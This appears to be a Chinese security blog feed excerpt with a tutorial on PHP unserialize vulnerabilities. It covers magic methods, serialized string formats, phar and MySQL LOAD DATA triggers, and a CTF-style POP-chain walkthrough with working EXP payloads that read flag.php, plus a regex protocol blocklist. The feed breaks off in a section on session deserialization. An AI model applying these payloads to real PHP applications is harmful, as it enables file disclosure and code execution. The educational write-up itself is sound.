class="headerlink" title="libxml"></a><a href="https://github.com/php/php-src/blob/master/ext/libxml/libxml.c#L329">libxml</a></h3><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/image-20200316133930297.png"></p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><a href="https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L50">MySQL</a></h3><p><img src="https://i.loli.net/2020/03/16/fnAFdDHWZi3ljRh.png"></p><p>我们注意到，<code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code>. 让我们测试一下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $output = <span class="string">&#x27;okok&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;$output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;meimima123&#x27;</span>, <span class="string">&#x27;dvwa&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://phar.phar/test.txt\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>再配置一下<code>mysql.ini</code>的<code>mysqld</code>。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这个例子在<a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>中也提到了，更加详细。</p><p>以上基本上就是phar的影响范围了，大家可以看到，影响非常的广，几乎所有用到wrapper封装的函数都可能存在这个问题。那么如何防御呢？</p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol><h1 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><p>本文是在学习各位大佬对phar与反序列化的分析后，进行的总结，这里感谢@ZSX, K0rz3n, Smi1e, Mochazz, seaii等等大佬的文章，读完都感觉获益良多。这篇总结基本上也就是把各位大佬的话总结复述了一遍，很多地方甚至是直接引用的，如有侵权，烦请联系。</p><p>考完研后，感觉一年和各位大佬的差距进一步拉大了，但是花了好几天复现和学习phar与php反序列化问题，随着一步一步的深入（由浅入深，由自己会的到自己不会的内容），真的很有获得感和满足感。希望以后我也能自己写出这样一篇篇出色的文章，做一个个这样深入的分析。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a> 2018/8, seaii</p></li><li><p><a href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p></li><li><p><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar">PHP反序列化入门之phar</a> 2019/02, Mochazz(七月火)</p></li><li><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解PHP反序列化漏洞</a> 2018/11 K0rz3n</p></li><li><p><a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 2018/10 zsx</p></li><li><p><a href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">php反序列化攻击拓展</a>  , Smi1e</p></li><li><p><a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前学校的seaii表哥在404发了一篇paper——&lt;a href=&quot;https://paper.seebug.org/680/&quot;&gt;利用 </summary>
      
    
    
    
    <category term="Web安全" scheme="v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="v0w.top/tags/php/"/>
    
    <category term="反序列化" scheme="v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化与POP链</title>
    <link href="v0w.top/2020/03/05/unsearise-POP/"/>
    <id>v0w.top/2020/03/05/unsearise-POP/</id>
    <published>2020-03-04T16:00:00.000Z</published>
    <updated>2020-07-18T10:30:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php反序列化与POP链"><a href="#php反序列化与POP链" class="headerlink" title="php反序列化与POP链"></a>php反序列化与POP链</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h2><p>php反序列化是很久之前就接触的漏洞，但是一直都没有深入的学习，只是知道一个大概，POP链的构造也不是很熟练，于是今天总结一下。本文将详细介绍<strong>php反序列化原理，为什么有的时候序列的payload无效，POP链的构造以及Session的反序列化</strong>下一节会具体学习如何利用phar协议扩展php反序列化的攻击面。</p><h2 id="0x01-反序列化基本知识"><a href="#0x01-反序列化基本知识" class="headerlink" title="0x01 反序列化基本知识"></a>0x01 反序列化基本知识</h2><h3 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h3><p><strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</p><p><strong>反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。</p><h3 id="1-2-php魔术方法"><a href="#1-2-php魔术方法" class="headerlink" title="1.2 php魔术方法"></a>1.2 php魔术方法</h3><p>PHP提供了许多“魔术”方法，这些方法由两个下划线前缀（__）标识。它们充当拦截器，在满足某些条件时会自动调用它们。 魔术方法提供了一些极其有用的功能。</p><p>常见的魔术方法有：</p><ol><li><p><code>__contruct()</code>  当一个对象创建时被调用</p></li><li><p><code>__destruct()</code>  当一个对象销毁前被调用</p></li><li><p><code>__sleep()</code>  在对象被序列化前被调用</p></li><li><p><code>__wakeup</code>    将在反序列化之后立即被调用</p></li><li><p><code>__toString</code> 当一个对象被当做字符串使用时被调用</p></li><li><p><code>__get()</code>,<code>__set()</code>   当调用或设置一个类及其父类方法中<strong>未定义的属性</strong>时</p></li><li><p><code>__invoke()</code>  调用函数的方式调用一个对象时的回应方法</p></li><li><p><code>__call</code> 和 <code>__callStatic</code>前者是调用类<strong>不存在的方法</strong>时执行，而后者是调用类不存在的静态方式方法时执行。</p></li></ol><p>通过调试下面这个程序，会对魔术方法的调用有更直观的认识，强烈建议单步调试一遍。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">&quot;V0W&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n__destruct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$property, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="string">&quot;\n__set() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__invoke() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __construct()</span></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __toSting()</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __sleep()</span></span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">//调用 __wakeup()</span></span><br><span class="line">$c = unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="comment">//不存在这个bbbb属性，调用 __get()</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;bbbb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//name是私有变量，不允许修改，调用 __set()</span></span><br><span class="line">$a-&gt;name = <span class="string">&quot;pro&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;name;</span><br><span class="line"><span class="comment">//将对象作为函数，调用 __invoke()</span></span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序结束，调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span></span><br></pre></td></tr></table></figure><h3 id="1-3-序列化后的字符串形式"><a href="#1-3-序列化后的字符串形式" class="headerlink" title="1.3 序列化后的字符串形式"></a>1.3 序列化后的字符串形式</h3><p>一个序列化的字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O代表这是一个对象，4代表对象名称的长度，2代表成员个数。</span><br><span class="line">大括号中分别是：属性名类型、长度、名称;值类型、长度、值。</span><br></pre></td></tr></table></figure><p>另外，<strong>注意到不同权限的属性，序列化之后的字符串存在区别：</strong></p><p><strong>public</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">&quot;serialize.txt&quot;</span>, $data);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O: 对象 4（类的名字长度为4）&quot;Test&quot;类名称</span></span><br><span class="line"><span class="comment">//2 （对象含有的属性数量）</span></span><br><span class="line"><span class="comment">//s:属性是字符串  4 是属性名称的长度 &quot;test&quot; 属性名称 s:2:&quot;ok&quot; 属性是字符串，长度2，值为&quot;ok&quot; </span></span><br><span class="line"><span class="comment">// s:另一个属性是字符串，3长度，var，属性值，N NULL另一个属性初始值为空  </span></span><br></pre></td></tr></table></figure><p>可以看到，public的属性，序列化后的值就是属性的名称和对应的值</p><p><img src="https://i.loli.net/2020/03/10/R5nuKyM4hV6Uvis.png"></p><p><strong>private</strong></p><p>换成private权限，属性在序列化后也会出现区别，用010editor容易看出。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">&quot;serialize.txt&quot;</span>, $data);</span><br></pre></td></tr></table></figure><p>属性名变成了<code>%00Test%00test</code>和<code>%00Test%00var</code></p><p>也就是<code>%00类名%00属性名</code></p><p><img src="https://i.loli.net/2020/03/10/jOGdk6VZvAqQPcN.png"></p><p><strong>protected</strong></p><p>换成protected, 属性序列化之后又变了，属性名变成了<code>%00*%00test</code>和<code>%00*%00var</code></p><p>也就是<code>%00*%00属性名</code></p><p><img src="https://i.loli.net/2020/03/10/whWsyA3YTH7JGtU.png"></p><p>注意到这些对构造序列化的字符串很关键，当我们直接将<code>private protected</code>的属性进行序列化，得到的序列化字符串的payload将无效，因为<code>0x00</code>的缘故。但是通过<code>urlencode</code>就可以避免这种当时可能会看起来莫名其妙的”bug“（个人经验==、）。</p><h2 id="0x02-php反序列化漏洞"><a href="#0x02-php反序列化漏洞" class="headerlink" title="0x02 php反序列化漏洞"></a>0x02 php反序列化漏洞</h2><p>反序列化本身不是漏洞，但是如果类的某些属性可控，那么在反序列的过程中就会自动的执行魔术方法，从而导致安全问题。</p><p>所以，通常反序列化漏洞的成因在于代码中的 <code>__unserialize()</code>,<code>__wakeup()</code>等魔术方法接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><p>下面举一个简单的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">&#x27;demo.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source($filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>上面的代码是接收一个参数<code>a</code>，然后将其反序列化，反序列化后，会调用<code>__wakeup()</code>方法。如果一切正常的话，这个方法是显示一下<code>demo.php</code>文件的源代码。但是参数<code>a</code>是可控的，也就是说对象<code>a</code>的属性是可控的。于是我们可以伪造一个<code>filename</code>来构造对象。</p><p><strong>EXP</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> popdemo();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($p));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/09/elb4YCrgB9oQcyn.png"></p><p>可以看到，当我们对象参数可控时，可以伪造对象的一些属性，从而实现任意文件读取等操作。</p><p>正如，之前所说， 如果我们没有<code>urlencode</code>，就会得到一个无效的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:7:&quot;popdemo&quot;:1:&#123;s:17:</span><br><span class="line">0x00之后会截断</span><br><span class="line"></span><br><span class="line">这样是可以的：</span><br><span class="line">a&#x3D;O:7:&quot;popdemo&quot;:1:&#123;s:17:&quot;%00popdemo%00filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/10/rOns25ZBmA1ueMw.png"></p><h2 id="0x03-POP链的构造"><a href="#0x03-POP链的构造" class="headerlink" title="0x03 POP链的构造"></a>0x03 POP链的构造</h2><h3 id="2-1-什么是POP链"><a href="#2-1-什么是POP链" class="headerlink" title="2.1 什么是POP链"></a>2.1 什么是POP链</h3><blockquote><p>玩过 pwn 的同学应该对 ROP 并不陌生，ROP 的全称是面向返回编程(Return-Oriented Programing),ROP 链构造中是寻找<strong>当前系统环境中</strong>或者<strong>内存环境里已经存在的</strong>、具有固定地址且带有返回操作的指令集,将这些<strong>本来无害的片段</strong>拼接起来，形成一个连续的层层递进的调用链，最终达到我们的执行 libc 中函数或者是 systemcall 的目的</p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的</p><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0X04-POP-%E9%93%BE%E7%9A%84%E4%BB%8B%E7%BB%8D">来自K0rz3n大佬</a></p></blockquote><p>我的理解是：构造一个完整的调用链，该调用链与原来代码的调用链一致，不过部分属性被我们所控制，从而达到攻击目的。构造的这条链就是POP链。</p><h3 id="2-2-用一个实例说明如何构造POP链"><a href="#2-2-用一个实例说明如何构造POP链" class="headerlink" title="2.2 用一个实例说明如何构造POP链"></a>2.2 用一个实例说明如何构造POP链</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>先看读文件的函数在哪：<code>Read.file_get</code>里面有一个<code>file_get_contents</code>    <code>Show._show()</code>中有一个<code>highlight_file</code></li><li>我们可控的是<code>hello</code>参数，调用<code>unserialize()</code>函数，即<code>__wakeup()</code>魔术方法，于是就只有<code>Show类</code>中存在该方法，但是注意到在<code>Show.__wakeup()</code>中存在一个正则匹配，这个正则匹配会将<code>$this-&gt;source</code>当成字符串来处理。也就是说会调用<code>Show.__toString()</code>方法。</li><li>定位到<code>Show.__toString()</code>，可以将<code>source</code>序列化为Show类的对象，就会调用<code>__toString</code>方法。<code>__toString</code>又会取一个<code>str[&#39;str&#39;]-&gt;source</code>，那么如果这个<code>source</code>不存在的话，就会执行<code>__get()</code>方法。</li><li><code>__get()</code>魔术方法会调用一个<code>$p变量</code>，这个也是可控的，然后会将p当做函数调用，此时触发了<code>Read.__invoke()</code>魔术方法</li><li><code>__invoke魔术方法</code>会触发<code>file_get()函数</code>,进而<code>base64_encode(file_get_contents($value))</code>最终达到读文件的目的。</li></ol><p>这样一条完整的链就分析完了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello -&gt; __wakeup -&gt; Show._show -&gt; Show.__toString -&gt; (不存在属性)Test.__get() -&gt; Read.__invoke</span><br></pre></td></tr></table></figure><p>注意对象关系（hello是Show的对象，source属性是Test的对象，p属性是Read的对象），然后写一个POP链的对应EXP，就可以了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$read = <span class="keyword">new</span> Read();</span><br><span class="line">$test-&gt;p = $read;</span><br><span class="line">$show-&gt;source = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($show);<span class="comment">//在存在private和protected属性的情况下还是需要使用urlencode的。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/10/25MVI1unUSGebAy.png"></p><h2 id="0x03-php的Session反序列化问题"><a href="#0x03-php的Session反序列化问题" class="headerlink" title="0x03 php的Session反序列化问题"></a>0x03 php的Session反序列化问题</h2><h3 id="3-1-PHP的Session存储机制"><a href="#3-1-PHP的Session存储机制" class="headerlink" title="3.1 PHP的Session存储机制"></a>3.1 PHP的Session存储机制</h3><p><code>php.ini</code>有一下配置项用于控制Session有关的设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;D:\xampp\tmp&quot;    表明所有的session文件都是存储在xampp&#x2F;tmp下</span><br><span class="line">session.save_handler&#x3D;files          表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start&#x3D;0                表明默认不启动session</span><br><span class="line">session.serialize_handler&#x3D;php       